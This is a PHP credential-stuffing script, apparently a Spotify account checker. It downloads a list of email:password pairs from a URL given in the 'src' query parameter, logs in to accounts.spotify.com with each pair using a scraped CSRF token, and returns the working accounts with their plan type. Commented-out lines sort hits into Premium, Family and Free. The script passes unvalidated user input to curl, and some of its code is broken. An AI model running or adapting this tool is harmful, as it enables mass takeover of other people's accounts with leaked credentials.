<?php 
      $url = (isset($_GET['src']) ? $_GET['src'] : return;);

      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      $data = curl_exec($ch);
      curl_close($ch);

      preg_match_all("/[a-zA-Z0-9\.]*@[a-zA-Z0-9\.:]*/m", $data, $hasil);

      $data = $hasil[0];
      for ($i=0; $i < count($data) ; $i++) { 
            $array = explode(":", $data[$i]);
            $parse['email'] = $array[0];
            $parse['pass'] = $array[1];
            $akun[] = $parse;
      }     
      
      foreach ($akun as $data) {
            $email = $data['email'];
            $pass = $data['pass'];
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_TIMEOUT, 600);
            curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie/cookie.txt");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_VERBOSE, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                  "Accept-Language: en-US,en;q=0.5",
            ));
            curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/login");
            $res = curl_exec($ch);
            preg_match_all("/csrf_token=(.*);Version=1;Domain=accounts.spotify.com;Path=/m", $res, $csrf);
            $csrf = trim($csrf[1][0]);

            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                  "Accept: application/json, text/plain, */*",
                  "Accept-Language: en-US,en;q=0.5",
                  "Content-Type: application/x-www-form-urlencoded",
                  "Cookie: sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; csrf_token=$csrf; __bon=MHwwfC0xNjc4Mzc5MzU2fC03MDQ5MTkzMjk1MnwxfDF8MXwx; fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; remember=brian%40gmail.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376"
            ));
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
            curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_POSTFIELDS,"remember=true&username=$email&password=$pass&csrf_token=$csrf");
            $res = curl_exec($ch);
            $r_check = json_decode($res);
            if (isset($r_check->error) && trim($r_check->error) == "errorInvalidCredentials" ) {
                  // $output[] =  ["status" => "error", "message" => "DIE|$email:$pass"];
            } elseif(isset($r_check->displayName) || stripos($json_encode($r_check), "displayName")) {
                  curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/id/account/overview/");
                  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
                  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0",
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language: en-US,en;q=0.5",
                  ));
                  $r_check = curl_exec($ch);
                  // preg_match_all('|<use xlink:href="#icon-checkmark"></use></svg></span>(.*)</h3><p class="subscription-status subscription-compact">|', $r_check, $acc_premium);
                  // echo($r_check);
                  // die();
                  preg_match_all('/<a href="\/id\/family\/overview"><svg><use xlink:href="#icon-redeem"><\/svg> (.*)<\/a>/m', $r_check, $acc_free);
                  // preg_match_all('|<p class="form-control-static" id="card-profile-country">(.*)</p></div><div class="form-group">|', $r_check, $country);
                  // if(trim($acc_premium[1][0]) == "Spotify Premium") { 
                  //       $status = "<font color='blue'>acc_premium</font>"; 
                  // // file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);

                  // } elseif(trim($acc_premium[1][0]) == "Premium for Family") {
                  //       $status = "<font color='gold'>Admin Family</font>";
                  // // file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);

                  // } elseif(trim($acc_free[1][0]) == "Spotify Free") {
                  //       $status = "<font color='red'>acc_free</font>";
                  // // file_put_contents("r_check/".$status."/".$date.".txt", $s_enailpass[0]."|".$s_enailpass[1]."\n", FILE_APPEND);
                  // }
                  // $country = $country[1][0];
                  // $r_checkult["error"] = 0;
                  // $r_checkult["msg"] = "<font color=green><b>Live</b></font> | $s_enailpass[0] | $s_enailpass[1] | Type : $status | Country : $country | [ Acc : Spotify ]";
            
                  @$val["user"] = $email;
                  @$val["pass"] = $pass;
                  // @$val["berlaku"] = $check->Berlaku[0];
                  @$val["jenis"] = $acc_free[1][0];
                  $output[] = $val;
                  // die(json_encode($r_checkult));
                  //          echo '{"error":0,"msg":"<div class=col-md-4><b><font color=green>LIVE</font></b></div> <div class=col-md-4>'.$s_enailpass[0].'|'.$s_enailpass[1].'</div><div class=col-md-4>Type:  <b>'.$status.'</b></div>"}';
            }
      }
      echo json_encode($output);
?>